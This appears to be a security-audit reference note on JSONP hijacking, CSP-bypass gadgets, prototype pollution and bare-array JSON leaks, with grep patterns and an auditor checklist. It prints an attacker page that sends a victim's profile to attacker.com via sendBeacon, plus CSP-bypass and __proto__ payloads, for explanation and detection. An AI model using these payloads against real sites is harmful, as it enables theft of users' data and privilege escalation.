# JSON Hijacking, JSONP & Array Poisoning — Elite Protocol

> **Context:** Often dismissed as "legacy", JSONP hijacking remains active in enterprise applications with decade-old integrations. Beyond that, modern variants (CORS misconfigurations, JSONP gadgets in CSP bypass chains) give this attack surface new relevance.

**Tags:** #medium #json #jsonp #xss #data-exfiltration #csrf #csp-bypass
**OWASP:** A01:2021 Broken Access Control / A05:2021 Security Misconfiguration
**CVSS Base:** 6.5–8.1 (High when combined with authentication bypass)

---

## Attack Surface Map

### 1. Classic JSONP Hijacking (Still in Production)

**How it works:** The API allows a caller to specify a JavaScript callback function name. The server wraps the response in that function call. A malicious site embeds this as a `<script>` tag — bypassing SOP.

**Victim response (legitimate):**
```
GET /api/profile?callback=processData
→ processData({"name":"Pedro","email":"pedro@example.com"})
```

**Attacker's malicious page:**
```html
<script>
  function processData(data) {
    navigator.sendBeacon("https://attacker.com/collect", JSON.stringify(data));
  }
</script>
<script src="https://target.com/api/profile?callback=processData"></script>
```

The browser sends the victim's authenticated cookies with the `<script>` request. The attacker receives the full profile.

**`grep_search`:** `callback=`, `jsonp`, `?cb=`, `?func=`, `res.jsonp(`, `echo $_GET['callback']`.

---

### 2. JSONP as a CSP Bypass Gadget (Modern Attack Vector)

If the target application has a CSP of `script-src 'self' target.com`, and `target.com` hosts a JSONP endpoint, the attacker can inject a `<script src="https://target.com/api?callback=alert(1)//">`.

**Detection:** Any JSONP endpoint on a domain that appears in a CSP `script-src` whitelist is a CSP bypass gadget.

**`grep_search`:** CSP headers or `meta` tags. Cross-reference whitelisted origins with known JSONP endpoints.

---

### 3. Rosetta Flash (JSONP + Flash SOP Bypass — Legacy but Documented)

If a JSONP endpoint allows arbitrary characters in the callback parameter (non-alphanumeric), the attacker can craft a callback that begins with valid ActionScript byte-code (which starts with `CWS` or `FWS`), making the browser interpret the JSONP response as a Flash file.

**`grep_search`:** Verify if callback parameter is restricted to `[a-zA-Z0-9._]` only.

---

### 4. `__proto__` Poisoning via JSON.parse (Prototype Pollution via Deserialization)

When a server-side library or client-side code uses `JSON.parse` on user input that contains prototype-polluting keys without sanitization:

```javascript
// Attacker submits:
{"__proto__": {"isAdmin": true}}

// Vulnerable merge:
Object.assign(options, JSON.parse(userInput));
// All subsequent objects created will have isAdmin = true
```

**`grep_search`:** `JSON.parse(req.body`, `JSON.parse(event.data`, `Object.assign(.*JSON.parse`. Check for absence of `json-flatten` or `@fastify/secure-json-parse`.

---

### 5. JSON Array Top-Level Response Leak (Legacy Browser Attack)

Older browsers (IE6/7) allowed overriding the `Array` constructor, meaning any page serving a top-level JSON array could have its data intercepted.

**Modern relevance:** While browser-side protections exist, servers that respond to auth-required endpoints with a bare array `[...]` instead of `{"data": [...]}` are still structurally broken and should be flagged.

**`grep_search`:** Routes that return `Response(queryset, many=True)` (Django REST) or `res.json(array)` (Express) without a wrapper object.

---

## Chained Exploitation Paths

```
JSONP endpoint + CSP whitelist → CSP bypass → Unrestricted XSS
JSONP + Authenticated session → Data exfiltration without any user interaction
JSON prototype pollution + Template engine → RCE via polluted template context
JSONP + Open Redirect → Callback URL bypass → Data exfiltration to attacker's real domain
```

---

## Strategic Checklist for Auditor
1. [ ] Search all routes for JSONP patterns (`?callback=`, `?cb=`, `res.jsonp(`).
2. [ ] Verify callback parameter is restricted to `[a-zA-Z0-9._$]`.
3. [ ] Cross-reference JSONP endpoints with CSP whitelist (potential Script Gadget chain).
4. [ ] Audit `Object.assign` / `_.merge` / `extend` calls with JSON-parsed user input.
5. [ ] Check if API endpoints return bare JSON arrays instead of wrapped objects.

---

*Tags: #jsonp #json-hijacking #prototype-pollution #csp-bypass #data-exfiltration #shiva-vault*
